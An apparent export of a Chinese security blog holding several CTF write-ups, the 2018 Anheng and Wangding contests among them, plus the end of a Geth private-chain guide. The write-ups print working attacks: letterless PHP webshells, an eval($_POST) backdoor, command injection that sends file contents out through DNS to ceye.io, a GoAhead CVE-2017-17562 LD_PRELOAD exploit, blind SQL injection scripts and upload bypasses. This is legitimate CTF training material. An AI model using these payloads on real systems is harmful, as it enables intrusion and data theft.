"0.0.0.0" --rpcport "8545" --rpccorsdomain "*" --port "30303" --nodiscover --rpcapi "db,eth,net,web3,miner,net,personal,net,txpool,admin,debug" --networkid 1900 --datadir "./testchain" --nat "any" --mine --minerthreads "1" 其中一些重要参数的含义为： —identity：节点名称 —rpc -rpcaddr “0.0.0.0” —rpcport “8545”：节点开放rpc连接，监听地址为0.0.0.0:8545 —rpcapi：rpc提供的api类型 —rpccorsdomain：rpc允许接入本节点的网段，分号隔开 —port：节点间联系使用的端口号 —networkid：区块链的网络号，唯一的标识一条区块链，比如说1=主链, 3=Ropsten测试链, 4=Rinkeby测试链 —mine —minerthreads 1：启动挖矿，开放1个线程 启动节点后，一条私有链就可以使用了，即可以连接该节点发布智能合约，或者发起新的交易。 例如：连接节点，查看账户 123456789101112$ geth attach http://localhost:8545Welcome to the Geth JavaScript console!instance: Geth/TestNode0/v1.7.0-unstable/linux-amd64/go1.10.1coinbase: 0x28c67f4a957fcd814effce00863eb3aeb9e9884aat block: 13 (Tue, 23 Oct 2018 20:55:04 DST) datadir: /home/anemone/testchain modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0&gt; eth.accounts["0x28c67f4a957fcd814effce00863eb3aeb9e9884a"]&gt;]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>Geth</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安恒9月赛babybypass复现&无字母数字的webshell思考]]></title>
    <url>%2Fctf-2018%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9Bbabybypass%E5%A4%8D%E7%8E%B0-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[一开始看这题满脑子想的都是用异或来做，结果发现没办法调用getflag函数，看了别人的wp才发现思路错了。 错误思路毕竟这个思路也蛮清奇，大概说一下吧： 思考这一个题目 12345678910111213141516if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;135)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function getFlag()&#123; echo "Flag";&#125; code参数由正则过滤了大小写字母以及数字，那么我们可以通过符号异或构造payload。 以下脚本可以打印出符号异或得到的值，经过试验26个字母的大小写都可以通过这种方法得到： 1234567891011121314151617181920212223def xor(): arr=[chr(i) for i in range(ord('a'),ord('z'))]+[chr(i) for i in range(ord('A'),ord('Z'))] test=['`','~','!','@','%','^','*','(',')','-','+','&#123;','&#125;','[',']',':','&lt;','&gt;','.',',',';','|'] for i in test: for j in test: res=chr(ord(i)^ord(j)) if res in arr: print i,j,res'''[ &lt; g[ &gt; e] ) t| : F@ , l[ : a[ &lt; g'[[]|@[['^'&lt;&gt;):,:&lt;''''if __name__ == '__main__': xor() 可以看到 ‘[‘ ^’&lt;’ =’g’, ‘[‘^’&gt;’=’e’, … 那么使用&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;就可以得到字符串’getFlag’，下面就是怎么调用，想到 $_=&#39;getFlag&#39;;$_();等同于getFlag();&#39;, 那么使用$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();就可以调用了，那么最后的payload就是code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_(); 按照此原理，可以构造出一句话比如： 123456789&lt;?php @$_++; // $_ = 1 $__=("#"^"|"); // $__ = _ $__.=("."^"~"); // _P $__.=("/"^"`"); // _PO $__.=("|"^"/"); // _POS $__.=("&#123;"^"/"); // _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt; 回到题目再看一下这道题目 1234567891011121314151617181920212223&lt;?php// include 'flag.php';// $code='[[]|@[['^'&lt;&gt;):,:&lt;';// echo $code.'()';// @eval($code);if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9_$]+/",$code))&#123; //* die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function getFlag()&#123; echo "Flag";&#125;//$hint = "php function getFlag() to get flag";?&gt; 在正则过滤那边，可以看到$和_都被过滤了，这直接导致了即使用上述方法得到了字符串，也没办法执行php的函数（这里纠正一下，php7中我们是可以通过(&#39;func_name&#39;)()在执行函数的，这样其实我的错误思路是可行的，甚至在无字母数字webshell之提高篇中，作者直接使用了取反字符串的方法构造了payload）。正确的做法使用php短标签是直接读文件，考虑如下php代码： 1&lt;?= `ls`?&gt; 执行结果 可以看到，&lt;?= ?&gt;是php的短标签，效果等同于: 1&lt;?php echo `ls` ?&gt; 那么在eval中怎么用这个短标签呢？答案是先使用tag（?&gt;）离开当前模式，再使用短标签，即123456接下来就是怎么绕过正则了，bash里面用通配符绕过就好了，即```bashcat /etc/passwd #替换为/???/??t /??c/p???w? 因此paylaod为code=?&gt;&lt;?=`/???/??? /???/???/????/*`;?&gt; (code=?&gt;&lt;?=` /bin/cat /var/www/html/*`;?&gt;), 会发现php代码里面的源代码getflag那一部分的函数是是从/flag里面读取的，那么构造code=?&gt;&lt;?=`/???/??? /????`;?&gt;相当于code=?&gt;&lt;?=` /bin/cat /flag`;?&gt;即可。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018“安恒杯”WEB安全测试秋季资格赛wp]]></title>
    <url>%2Fctf-2018%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E8%B5%84%E6%A0%BC%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。 奇怪的恐龙特性进入靶机，可以看到网页源码 1234567891011121314151617181920&lt;?php highlight_file(__FILE__); ini_set("display_error", false); error_reporting(0); $str = isset($_GET['A_A'])?$_GET['A_A']:'A_A'; if (strpos($_SERVER['QUERY_STRING'], "A_A") !==false) &#123; echo 'A_A,have fun'; &#125; elseif ($str&lt;9999999999) &#123; echo 'A_A,too small'; &#125; elseif ((string)$str&gt;0) &#123; echo 'A_A,too big'; &#125; else&#123; echo file_get_contents('flag.php'); &#125; ?&gt; A_A,too small 首先要绕过isset($_GET[&#39;A_A&#39;]) &amp;&amp; strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;)，表面上说我们需要生成一个GET请求并且参数为AA，但是第二个判断有要求GET请求的参数不能为A_A，看起来这是不可能的，但是由于PHP特性，会自动替换.为``，因此我们可以构造 http://ip/?A.A=xxx来绕过这个判断。 接着我们需要绕过后面两个对$str的判断，即保证$str&lt;9999999999 || (string)$str&gt;0==false，这看起来写是不可能，但是在PHP中，我们可以使$str为一个数组，由于类型不同无法判断/强制转化，因此这样两个判断就都不成立了，这样我们就可以开心的getflag了。最后的GET请求为http://114.55.36.69:8022/?A.A[]=1 ping也能把你ping挂0x01进入靶机，跳转到ping的页面，猜测有命令注入的问题 尝试后发现;，空格被过滤，并且长度存在限制，这样我们只能用ls先看下当前目录有啥东西了： 这里我们发现了上传入口：you_find_upload.php。 0x02进入http://114.55.36.69:6664/you_find_upload.php，看到可以查看源码，那就点进去查看吧 前面那一串数字先不管，将后面的base64解码，得到上传的源代码： 12345678910111213141516171819202122232425&lt;?php$type = array('gif','jpg','png');mt_srand((time() % rand(1,100000)%rand(1000,9000)));echo mt_rand();if (isset($POST['submit'])) &#123; $check = getimagesize($FILES'file'); @$extension = end(explode('.',$FILES'file')); if(in_array($extension,$type))&#123; echo 'File is an image - ' . $check['mime']; $filename = mt_rand().''.$FILES'file'; move_uploaded_file($FILES'file', $filename); echo "&lt;br&gt;\n"; &#125; else &#123; echo "File is not an image"; &#125;&#125;if(isset($GET['p']))&#123; if(@preg_match("/..\//",$GET['p']))&#123; echo "你这个孩子，too young too simple"; &#125; else&#123; @include $_GET['p'].".php"; &#125;&#125;?&gt; 0x03首先我们需要绕过文件类型限制，in_array($extension,$type)表示我们得上传后缀是gif，jpg或png的文件，这里复习一下上传绕过的普通套路： Apache 1.php.jpg #从apache从右往左，直到可解析的文件后缀 Nginx 1.php%001.jpg #00处截断 IIS a.asp;jpg a.php. 和a.php[空格] #会自动去掉空格 注意到这里用的是Apache容器，那我们就上传个backdoor.php.jpg文件就好了 看到这里我们已经上传成功了 0x04接下来我们需要确定上传后的文件名，再次查看源码，点击上传后，程序首先使用mt_srand((time() % rand(1,100000)%rand(1000,9000)));设置了随机数种子，并且打印第一个随机数echo mt_rand();；而上传文件名就是第二个随机数+原本文件名$filename = mt_rand().&#39;&#39;.$FILES&#39;file&#39;;，这样的伪随机数是存在问题的，我们可以根据第一个随机数暴力破解出随机数种子（注意到这里的种子∈[1000,9000]），然后再计算出第二个随机数。 以第3步的上传结果为例，使用php_mt_seed.exe计算出随机数种子为5240. 1234λ php_mt_seed.exe 823735129Found 0, trying 0 - 33554431, speed 0 seeds per secondseed = 5240Found 1, trying 67108864 - 100663295, speed 71014670 seeds per second 接着推测出第二个随机数： 12345678910λ cat test.php&lt;?phpmt_srand(5240);echo mt_rand();echo "\n";echo mt_rand();?&gt;λ php test.php823735129288373614 那么我们的文件名就是288373614_backdoor.php.jpg 后面就可以连菜刀http://114.55.36.69:6664/upload/288373614_backdoor.php.jpg，flag在根目录 ping这题算是看着答案做出来的，不过思路很好，用到了DNS带外数据的知识，这里也记录一下： 0x01首先还是扫描网站，可以看到网站泄露了一个robots.txt文件 访问该文件，看到目录下存在index.txt，where_is_flag.php文件 先看index.txt: 1&lt;?php include("where_is_flag.php");echo "ping";$ip =(string)$_GET['ping'];$ip =str_replace("&gt;","0.0",$ip);system("ping ".$ip); 可以看到存在命令执行，ping参数会直接拼接在ping命令后 where_is_flag.php我们需要用命令执行才能看了。 0x02尝试使用http://114.55.36.69:8015/?ping=127.0.0.1，发现网站未响应，这是因为后台正在循环ping，说明了命令执行成功。 接着尝试使用http://114.55.36.69:8015/?ping=-c 1 127.0.0.1，可以发现网站网站后台并没有回显ping的结果，这说明虽然网站执行了命令，但是并不返回命令执行结果。 那么如何拿到命令执行结果呢？第一个想到的是使用http请求，比如说wget www.mysite.com/$(cat flag.php)，但是尝试后发现无效，这可能是服务器并没有wget命令。 正解是使用dns解析获取带外数据，这里推荐一个平台：http://ceye.io，登录之后可以获得一个专属的地址（假设为qwerty.ceye.io），那么如果我们ping &#96;whoami&#96;.qwerty.ceye.io，由于ping的第一步是dns解析，所以在http://ceye.io/records/dns就可以看whoami命令执行的结果： 根据上述原理，我们可以获取where_is_flag.php，但是如果文件内容中有空格，我们的ping命令就不能执行了，所以用sed命令将空格换成sspacee。这样我们ping参数为：http://114.55.36.69:8015/?ping= &#96;cat where_is_flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io 同时在ceye中可以看到文件内容了 接着访问dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php，如法炮制即可： http://114.55.36.69:8015/?ping= &#96;cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed ‘s/\s/sspacee/g’&#96;.0ri9zr.ceye.io 可以看到flag： 拓展： 不止是命令执行，dns的带外数据还能传很多东西比如说SQL注入、XXE，详细可以看http://ceye.io/payloads，Github上也有了利用该方法进行SQL注入的工具（https://github.com/ADOOO/DnslogSqlinj) ProxyError修改Host:192.168.5.132 新瓶装旧酒0x01 代码审计+文件上传这里可以看到需要上传一个zip文件： 这里看到zip文件中需要包含一个图片后缀： 根据apache的特性，使用大马1.pHp.png(注意到文件名不能有.ph)，并且压缩成zip上传，发现flag.php。 GOGOGO0x01 GoAhead CVE-2017-17562实际上腾讯的“开源Web服务器GoAhead漏洞CVE-2017-17562分析“ 一文已经对此漏洞进行了详细解释，这里只概括的说一下： 因为cgiHandler的过滤不当，导致LD_PRELOAD变量可控，而程序会读取LD_PRELOAD变量记录的文件路径并且执行文件代码； launchCgi函数调用系统函数dup2()将stdin文件描述符指向了POST请求数据对应的临时文件。 从发送payload的命令可以看到，我们的POST中控制了两个输入，一个是LOAD_PRELOAD参数（将它设置为了/proc/self/fd/0），一个是POST的data（将它设置为了我们编译生成的动态链接库）。/proc/self/fd/0 是Linux的伪文件系统文件，实际上指的是stdin，以下命令的执行结果可以说明这一点： 这样结合第一条，即程序会从我们标准输入中取代码执行，又因为第二条，我们的标准输入被定向到了POST的临时文件中，具体来说，即定向到了我们的payload.so文件上，这样整个原理就走通了。 0x02 复现CVE准备payload 12345678910#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void) &#123; /* printf("hello, payload executed.\n"); */ system("cat /var/www/goahead/cgi-bin/hello.cgi");&#125; 编译1$ gcc -shared -fPIC ./payload.c -o payload.so 触发payload 12345678910111213141516$ curl -X POST --data-binary @payload.so http://114.55.36.69:8018/cgi-bin/hello.cgi?LD_PRELOAD=/proc/self/fd/0 -iHTTP/1.1 200 OKServer: GoAhead-httpDate: Fri Oct 12 13:38:48 2018Transfer-Encoding: chunkedConnection: keep-aliveX-Frame-Options: SAMEORIGINPragma: no-cacheCache-Control: no-cache#!/usr/bin/perlprint "Content-Type: text/html\n\n";print "Hello GOGOGO";#flag&#123;ef9f1f880e1f001bedd32bfc52674128&#125;#!/usr/bin/perlcurl: (56) Illegal or missing hexadecimal sequence in chunked-encoding 进击的盲注0x01 敏感信息泄露扫描存在robots.txt 0x02 SQL盲注看源码，username处存在注入，过滤符号”(“,”)” 使用regexp binary注入： 1234567891011121314151617181920212223242526272829burp0_url = "http://114.55.36.69:6663/index.php"burp0_headers = &#123; "Cache-Control": "max-age=0", "Origin": "http://114.55.36.69:6663", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://114.55.36.69:6663/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125;result = ''payload = "admin' and password regexp binary '^&#123;res&#125;'#"for i in xrange(0,50): for j in xrange(32,126): if chr(j) in ['*','\\','/','(',')','+','.','?','[',']','^']: continue hh = payload.format(res=result+chr(j) print hh burp0_data = &#123;"username": hh, "password": "admin"&#125; zz = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) #print zz.content if 'password error!' in zz.content: result += chr(j) print result break 得到：dVAxMEBkX25Fdy5waHA=$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ base64解码后得到uP10@d_nEw.php 0x03 文件上传绕过访问看到一个上传界面 传大马，发现根目录下存在flag： 艰难的Bypass之路用户名爆破，发现lili可用： 查看哪些关键词被过滤： 123456789101112131415import requestsdef detect(): waf_words=['ord', 'or', 'union', 'select', 'and', 'from', 'order by', 'substr', "'", '*', '&amp;&amp;', 'information_schema', ' ', '%', 'group_concat', '(', '"', 'where', 'if', ' ', '||', '#', '--+', '_', '`', '/', '&lt;&gt;', 'in', '=', 'mid', 'like', 'database()', '&gt;', 'user()', 'tables', 'limit'] burp0_url = "http://114.55.36.69:6661/index.php" burp0_cookies = &#123;"PHPSESSID": "jrspq1dsdrt8gn6tqq35mdatn0"&#125; burp0_headers = &#123;"Cache-Control": "max-age=0", "Origin": "http://114.55.36.69:6661", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://114.55.36.69:6661/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125; for each in waf_words: burp0_data=&#123;"username": "admin&#123;&#125;".format(each), "passwd": "admin"&#125; res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) if "illegal characters!" in res.text: print eachif __name__ == '__main__': detect() 非正常解法扫描到上传目录 0x01 发现dalao留的后门http://114.55.36.69:6663/uploads/ 0x02 直接用大佬的后门以a.php;.jpg为例，查看后门密码 1&lt;script language="pHp"&gt;@eval($_POST['sb'])&lt;/script&gt; 菜刀连接，查看flag /flag 或者大马http://114.55.36.69:6663/uploads/shell.php.jpg 密码admin]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018网鼎杯二叉树&martricks wp]]></title>
    <url>%2Fctf-2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E4%BA%8C%E5%8F%89%E6%A0%91-martrickswp%2F</url>
    <content type="text"><![CDATA[2018年网鼎杯，emmm，好不容易看到个算法题还花了很长时间，太难过了T_T 二叉树0x01下载题目后，得到一张红黑树的图片和README.txt. 将readme进行base64解码可以得到hit： 1234561.这是一棵红黑树2.树从1-59上的果子依次为 ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:3.依次从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子,过程中保持红黑树性质不变4.tmpflag为第 8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23 个果子5.flag为 tmpflag 红色果子 ASCII +1 , 黑色果子 ASCII-16.让我们愉快的开始获取flag吧 0x02经过提示，首先需要找一份红黑树的实现，并且按照图片构造一颗红黑树(如果不按图片会出现多解情况，因为这点被坑惨)，以下给出一个很好的python版红黑树实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323# -*- coding: utf-8 -*-BLACK = 0RED = 1#graphic elements of rbtree for printingVC = '│'HC = '─'SIZE = 3RIG = '┌' + HC * SIZELEF = '└' + HC * SIZESP = chr(32)IND1 = SP * (SIZE + 1)IND2 = VC + SP * SIZEclass rbnode(object): def __init__(self, key=None, value=None, color=BLACK,left=None,right=None,p=None): self.key = key self.value = value self.color = color self.left = left self.right = right self.p = p def __repr__(self): return '%s%s%s' % (self.key,'◆' if self.color is BLACK else '◇',self.value )_NONE=rbnode()class rbtree(object): def __init__(self, data=False,default_value=0, nodes=None): if nodes: self.root = nodes[28] self.default_value = default_value #for method: force_search self.nil = _NONE else: self.nil = _NONE self.root = self.nil self.default_value = default_value #for method: force_search if hasattr(data, '__iter__'): for key, value in data: self.insert(rbnode(key,value)) def __repr__(self): return '\n'.join(self.graph()) def graph(self, x=False, prefix=''): "beautifully print rbtree, big key node first" if x is False: x = self.root if x is not self.nil: p = x.p last_prefix = '' if p is not self.nil: pp = p.p last_prefix = LEF if p.left is x else RIG if pp is not self.nil: if (pp.left is p) is (p.left is x): prefix = prefix + IND1 else: prefix = prefix + IND2 yield from self.graph(x.right, prefix) yield '%s%s%s' % (prefix, last_prefix, x) yield from self.graph(x.left, prefix) def search(self, key, x=False): "find node according to key, return self.nil if not found" if x is False: x = self.root while (x is not self.nil) and (key != x.key): if key &lt; x.key: x = x.left else: x = x.right return x def insert(self, z): "insert z node with key and value" y = self.nil x = self.root while x is not self.nil: y = x if z.key &lt; x.key: x = x.left else: x = x.right z.p = y if y is self.nil: self.root = z elif z.key &lt; y.key: y.left = z else: y.right = z z.left = self.nil z.right = self.nil z.color = RED self.insert_fixup(z) def delete(self, z): y = z y_original_color = y.color if z.left is self.nil: x = z.right self.transplant(z, x) elif z.right is self.nil: x = z.left self.transplant(z, x) else: y = self.minimum(z.right) y_original_color = y.color x = y.right if y.p is z: x.p = y else: self.transplant(y, x) y.right = z.right y.right.p = y self.transplant(z, y) y.left = z.left y.left.p = y y.color = z.color if y_original_color is BLACK: self.delete_fixup(x) def is_empty(self): return self.root is self.nil def right_walk(self, x=False): if x is False: x = self.root if x is not self.nil: yield from self.right_walk(x.right) yield x yield from self.right_walk(x.left) def left_walk(self, x=False): if x is False: x = self.root if x is not self.nil: yield from self.left_walk(x.left) yield x yield from self.left_walk(x.right) def force_search(self,key): y = self.nil x = self.root while x is not self.nil: if key == x.key: return x y = x if key &lt; x.key: x = x.left else: x = x.right z = rbnode() original_z = z z.key = key z.value = self.default_value z.p = y if y is self.nil: self.root = z elif z.key &lt; y.key: y.left = z else: y.right = z z.left = self.nil z.right = self.nil z.color = RED self.insert_fixup(z) return original_z def maximum(self, x=False): if x is False: x = self.root while x.right is not self.nil: x = x.right return x def minimum(self, x=False): if x is False: x = self.root while x.left is not self.nil: x = x.left return x def successor(self, x): "return node with smallest key greater than x.key" if x.right is not self.nil: return self.minimum(x.right) y = x.p while (y is not self.nil) and (x is y.right): x = y y = y.p return y def predecessor(self, x): "return node with biggest key lower than x.key" if x.left is not self.nil: return self.maximum(x.left) y = x.p while (y is not self.nil) and (x is y.left): x = y y = y.p return y def left_rotate(self, x): y = x.right x.right = y.left if y.left is not self.nil: y.left.p = x y.p = x.p if x.p is self.nil: self.root = y else: if x is x.p.left: x.p.left = y else: x.p.right = y y.left = x x.p = y def right_rotate(self, x): y = x.left x.left = y.right if y.right is not self.nil: y.right.p = x y.p = x.p if x.p is self.nil: self.root = y else: if x is x.p.right: x.p.right = y else: x.p.left = y y.right = x x.p = y def insert_fixup(self, z): while z.p.color is RED: if z.p is z.p.p.left: y = z.p.p.right if y.color is RED: z.p.color = BLACK y.color = BLACK z.p.p.color = RED z = z.p.p else: if z is z.p.right: z = z.p self.left_rotate(z) z.p.color = BLACK z.p.p.color = RED self.right_rotate(z.p.p) else: y = z.p.p.left if y.color is RED: z.p.color = BLACK y.color = BLACK z.p.p.color = RED z = z.p.p else: if z is z.p.left: z = z.p self.right_rotate(z) z.p.color = BLACK z.p.p.color = RED self.left_rotate(z.p.p) self.root.color = BLACK def delete_fixup(self, x): while (x is not self.root) and (x.color is BLACK): if x is x.p.left: w = x.p.right if w.color is RED: w.color = BLACK x.p.color = RED self.left_rotate(x.p) w = x.p.right if (w.left.color is BLACK) and (w.right.color is BLACK): w.color = RED x = x.p else: if w.right.color is BLACK: w.left.color = BLACK w.color = RED self.right_rotate(w) w = x.p.right w.color = x.p.color x.p.color = BLACK w.right.color = BLACK self.left_rotate(x.p) x = self.root else: w = x.p.left if w.color is RED: w.color = BLACK x.p.color = RED self.right_rotate(x.p) w = x.p.left if (w.right.color is BLACK) and (w.left.color is BLACK): w.color = RED x = x.p else: if w.left.color is BLACK: w.right.color = BLACK w.color = RED self.left_rotate(w) w = x.p.left w.color = x.p.color x.p.color = BLACK w.left.color = BLACK self.right_rotate(x.p) x = self.root x.color = BLACK def transplant(self, u, v): if u.p is self.nil: self.root = v elif u is u.p.left: u.p.left = v else: u.p.right = v v.p = u.p 这段红黑树的果子为rbnode对象，整个树根据果子的key构建，果子的value可以可以放我们字符串的字符。默认的红黑树时通过不断加入节点自动生成的，但是加入果子的顺序不同会造成树以及果子的颜色的不同，可以看到我对标准的红黑树构造函数做了修改，这样我们可以根据给出的图片（1.jpg）构造一个红黑树。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778if __name__ == '__main__': #提示2，果子的value _str=" ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:" nodes=[_NONE] for i in range(1,60): nodes.append( rbnode(key=i,value=_str[i]) ) # node, color, l,r,p # 录入图片红黑树的信息 tree=[ [1,BLACK,0,2,3], [2,RED,0,0,1], [3,RED,1,4,6], [4,BLACK,0,5,3], [5,RED,0,0,4], [6,BLACK,3,8,10], [7,RED,0,0,8], [8,BLACK,7,9,6], [9,RED,0,0,8], [10,RED,6,18,23], [11,RED,0,0,12], [12,BLACK,11,13,14], [13,RED,0,0,12], [14,RED,12,16,18], [15,RED,0,0,16], [16,BLACK,15,17,14], [17,RED,0,0,16], [18,BLACK,14,20,10], [19,BLACK,0,0,20], [20,RED,19,21,18], [21,BLACK,0,22,20], [22,RED,0,0,21], [23,BLACK,10,26,28], [24,RED,0,0,25], [25,BLACK,24,0,26], [26,BLACK,25,27,23], [27,BLACK,0,0,26], [28,BLACK,23,43,0], [29,RED,0,0,30], [30,BLACK,29,31,32], [31,RED,0,0,30], [32,BLACK,30,34,35], [33,RED,0,0,34], [34,BLACK,33,0,32], [35,RED,32,37,43], [36,BLACK,0,0,37], [37,BLACK,36,40,35], [38,BLACK,0,39,40], [39,RED,0,0,38], [40,RED,38,41,37], [41,BLACK,0,42,40], [42,RED,0,0,41], [43,BLACK,35,53,28], [44,BLACK,0,0,45], [45,RED,44,46,48], [46,BLACK,0,47,45], [47,RED,0,0,46], [48,BLACK,45,50,53], [49,BLACK,0,0,50], [50,RED,49,51,48], [51,BLACK,0,52,50], [52,RED,0,0,51], [53,RED,48,57,43], [54,RED,0,0,55], [55,BLACK,54,56,57], [56,RED,0,0,55], [57,BLACK,55,59,53], [58,RED,0,0,59], [59,BLACK,58,0,57], ] for i in range(len(tree)): nodes[tree[i][0]].color=tree[i][1] nodes[tree[i][0]].left=nodes[tree[i][2]] nodes[tree[i][0]].right=nodes[tree[i][3]] nodes[tree[i][0]].p=nodes[tree[i][4]] # 打印二叉树 tr=rbtree(nodes=nodes) print(tr) 备注： 这真的是一个红黑树的一个很好的实现，还可以可视化的打印整棵树，这里给出正常的构造树的方法，只需给出果子的key和value： 123if __name__ == '__main__': tr=rbtree(data=&#123;'1':'1','2':'2'&#125;.items()) print(tr) 0x03根据提示3，从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子： 12for i in [18,35,53,50,14,28,19,6,54,36]: tr.delete(tr.force_search(i)) 0x04根据提示4和5，获取第[8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23]果子的值，并且按照颜色对其ascii+1或-1，即可得到flag 12345678s=""for i in [8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23]: node=tr.force_search(i) if node.color==BLACK: s+=chr(ord(node.value)-1) else: s+=chr(ord(node.value)+1)print(s) 算出flag为：flag{10ff49a7-db11-4e43-b4f6-66ef12ceb19d} martricks刚拿到这题就感觉跟符号执行有关系，可惜没有贯彻思想继续做下去，不过解法蛮简单的，这里简单记录一下，也是当学习一下angr吧： 0x01拿到题目ida打开，大概F5看一下，有一个判断，如果等于0就congrats否则wrong，那么记下这两处字符串的地址。 0x02接下来就可以用angr调用该文件，根据符号执行让我们执行到400A84地址，其中避免经过400A90地址 12345678910111213import angrdef angr_example(): p = angr.Project("./martricks") simgr = p.factory.simulation_manager(p.factory.full_init_state()) simgr.explore(find=0x400A84, avoid=0x400A90) # 成功路径，失败路径 return simgr.found[0].posix.dumps(0).strip('\0\n')if __name__ == '__main__': print angr_example() 等待一会后得到flag： flag{Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3} 注： 所有程序题目已经上传至GitHub：https://github.com/Anemone95/ctf_wp/tree/master/wangding2018]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二叉树</tag>
        <tag>符号执行</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 “巅峰极客” CTF A Simple CMS&loli WP]]></title>
    <url>%2Fctf-i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF-A-Simple-CMS-loli-WP%2F</url>
